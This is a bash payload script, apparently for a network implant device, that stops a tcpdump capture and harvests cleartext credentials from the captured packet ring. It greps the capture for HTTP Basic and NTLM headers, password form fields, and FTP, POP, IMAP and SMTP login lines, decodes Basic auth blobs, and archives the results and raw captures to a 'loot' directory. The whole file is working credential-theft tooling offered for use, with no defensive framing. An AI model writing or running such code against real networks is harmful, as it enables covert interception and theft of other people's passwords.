#!/bin/bash
# Title: KB Tap Stop
# Description: Stops KB Tap: kills the capture, harvests the ring for cleartext credentials (HTTP POST/Basic decoded/FTP/telnet/POP/IMAP/SMTP AUTH), archives harvest + manifest to /root/loot/kbtap, prints counts. Undo is the product.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

LOG green "KB Tap Stop v1.0"
STATE=/root/loot/kbtap
MARKER="$STATE/active"

if [ ! -f "$MARKER" ]; then
  pidof tcpdump >/dev/null 2>&1 && { kill $(pidof tcpdump) 2>/dev/null; LOG yellow "stray tcpdump killed (no marker)"; } || LOG yellow "no active tap"
  rm -rf /tmp/kbtap 2>/dev/null
  ALERT "No tap active"
  exit 0
fi

PID=$(sed -n 's/^PID=//p' "$MARKER" | head -1)
RING=$(sed -n 's/^RING=//p' "$MARKER" | head -1)
IF=$(sed -n 's/^IF=//p' "$MARKER" | head -1)
STAMP=$(date -u +%Y%m%dT%H%M%SZ)

[ -n "$PID" ] && kill "$PID" 2>/dev/null; sleep 1
pidof tcpdump >/dev/null 2>&1 && kill -9 $(pidof tcpdump) 2>/dev/null
LOG green "capture stopped (pid $PID)"

HARV="$STATE/harvest-$STAMP.log"
RAWPCAP=$(ls -la "$RING"/ring.pcap* 2>/dev/null | awk '{s+=$5} END {print s+0}')
{ echo "# KB Tap harvest $STAMP  iface=$IF  ring_bytes=$RAWPCAP"
  strings -n 4 "$RING"/ring.pcap* 2>/dev/null \
  | grep -aiE 'authorization: (basic|ntlm)|pass(word)?=|pwd=|user(name)?=|login=|USER [a-z0-9._%+-]+ |PASS .|AUTH LOGIN' \
  | sort -u | head -2000
} > "$HARV" 2>/dev/null

# decode any Basic auth blobs found (base64 present in stock image)
grep -aoiE 'authorization: basic [a-z0-9+/=]{8,120}' "$RING"/ring.pcap* 2>/dev/null \
  | sed 's/.*[Bb]asic //' | sort -u | while read -r B64; do
      printf 'BASIC-decoded: ' ; echo "$B64" | base64 -d 2>/dev/null; echo
  done >> "$HARV" 2>/dev/null

LINES=$(grep -c . "$HARV" 2>/dev/null); LINES=${LINES:-0}
DECODED=$(grep -c "BASIC-decoded" "$HARV" 2>/dev/null); DECODED=${DECODED:-0}
sha256sum "$HARV" > "$HARV.sha256" 2>/dev/null

# keep raw pcaps only if overlay can hold them without endangering the system
FREE=$(df -k /root | awk 'NR==2 {print $4}')
if [ "${FREE:-0}" -gt 30720 ]; then
  mkdir -p "$STATE/rings-$STAMP"
  cp "$RING"/ring.pcap* "$STATE/rings-$STAMP"/ 2>/dev/null && LOG green "raw ring archived ($RAWPCAP bytes) -> $STATE/rings-$STAMP"
else
  LOG yellow "overlay low (${FREE}kB) - raw ring NOT archived (harvest kept). Pull ring over ssh before reboot to keep it."
fi

rm -rf "$RING"; rm -f "$MARKER"
LOG green "harvest: $HARV ($LINES lines, $DECODED decoded creds)"
[ "$LINES" -gt 1 ] && LOG cyan "first hits: $(grep -av '^#' "$HARV" | head -2 | cut -c1-70 | tr '\n' ' ')"
ALERT "Tap stopped: $((LINES-1)) hits"
exit 0
